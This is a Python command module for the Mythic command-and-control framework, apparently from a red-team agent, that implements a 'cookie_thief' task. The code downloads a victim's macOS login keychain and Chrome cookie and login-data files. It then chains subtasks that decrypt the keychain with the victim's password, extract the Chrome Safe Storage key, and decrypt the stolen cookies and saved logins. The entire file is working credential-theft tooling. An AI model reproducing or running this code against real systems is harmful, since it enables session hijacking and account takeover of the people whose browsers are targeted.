from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import sys


class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="User Login Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                description="choose the browser to steal cookies from",
                default_value="chrome",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = False
    help_cmd = "cookie_thief -password \"user account password\" -browser {browser} -username {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.downloads_complete
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        if task.status == MythicStatus.Completed:
            responses = await MythicRPC().execute("get_responses", task_id=task.id)
            if responses.status == MythicStatus.Success:
                for f in responses.response["files"]:
                    await MythicRPC().execute("update_file", file_id=f["agent_file_id"],
                                              comment=task.args.get_arg('username'))
                    if f["filename"] == "login.keychain-db":

                        task.status = MythicStatus("delegating")
                        decryptTask = await MythicRPC().execute("create_subtask",
                                                                parent_task_id=task.id,
                                                                command="decrypt_keychain",
                                                                params_dict={
                                                                    "password": task.args.get_arg("password"),
                                                                    "username": task.args.get_arg("username"),
                                                                    "file_id": f["agent_file_id"]
                                                                },
                                                                subtask_callback_function="decrypt_complete")
                        if decryptTask.status == MythicRPCStatus.Success:
                            pass
                        else:
                            await MythicRPC().execute("create_output", task_id=task.id,
                                                      output=decryptTask.error)
                            task.status = MythicStatus("Error: Failed to issue decryption subtask")
                return task
        else:
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output="Not automatically decrypting since downloading failed\n")
        return task

    async def decrypt_complete(self, task: MythicTask, subtask: dict = None,
                                 subtask_group_name: str = None) -> MythicTask:
        # now we should have some credentials, specifically the chrome safe storage credential
        # task is the cookie_thief command, subtask is the result of my decrypt_keychain command
        if subtask["status"] == "completed":
            chrome_password = await MythicRPC().execute("get_credential",
                                                        task_id=task.id,
                                                        account="Chrome",
                                                        realm="Chrome Safe Storage",
                                                        comment=task.args.get_arg("username"))
            if chrome_password.status == MythicRPCStatus.Success and len(chrome_password.response) > 0:
                task.status = MythicStatus("delegating")
                responses = await MythicRPC().execute("get_responses", task_id=task.id)
                if responses.status == MythicStatus.Success:
                    for f in responses.response["files"]:
                        if f["filename"].lower() == "cookies":
                            cookie_decrypt_task = await MythicRPC().execute("create_subtask",
                                                                            parent_task_id=task.id,
                                                                            command="decrypt_chrome_cookies",
                                                                            params_dict={
                                                                                "username": task.args.get_arg("username"),
                                                                                "password": chrome_password.response[0]["credential"],
                                                                                "file_id": f["agent_file_id"]
                                                                            },
                                                                            subtask_callback_function="decrypted_cookies")
                            if cookie_decrypt_task.status == MythicRPCStatus.Success:
                                continue
                            else:
                                await MythicRPC().execute("create_output", task=task.id,
                                                          output=cookie_decrypt_task.error)
                                task.status = MythicStatus("Error: Decrypt Cookie Error")
                        if "data" in f["filename"].lower():
                            cookie_decrypt_task = await MythicRPC().execute("create_subtask",
                                                                            parent_task_id=task.id,
                                                                            command="decrypt_chrome_login_data",
                                                                            params_dict={
                                                                                "username": task.args.get_arg("username"),
                                                                                "password": chrome_password.response[0]["credential"],
                                                                                "file_id": f["agent_file_id"]
                                                                            },
                                                                            subtask_callback_function="decrypted_cookies")
                            if cookie_decrypt_task.status == MythicRPCStatus.Success:
                                continue
                            else:
                                await MythicRPC().execute("create_output", task=task.id,
                                                          output=cookie_decrypt_task.error)
                                task.status = MythicStatus("Error: Decrypt Cookie Error")
                    return task
            else:
                await MythicRPC().execute("create_output", task=task.id,
                                          output=f"Failed to find a chrome storage password for {task.args.get_arg('username')}")
                task.status = MythicStatus("Error: Failed to Find Chrome Storage Password")
        else:
            await MythicRPC().execute("create_output",
                                      task_id=task.id,
                                      output="Login Keychain decryption failed, not continuing on to decrypt cookies")
        return task

    async def decrypted_cookies(self, task: MythicTask, subtask: dict = None,
                               subtask_group_name: str = None) -> MythicTask:
        if subtask["status"] == "completed":
            task.status = MythicStatus.Completed
            return task
        else:
            task.status = MythicStatus("Error: cookie decryption failed")
            return task

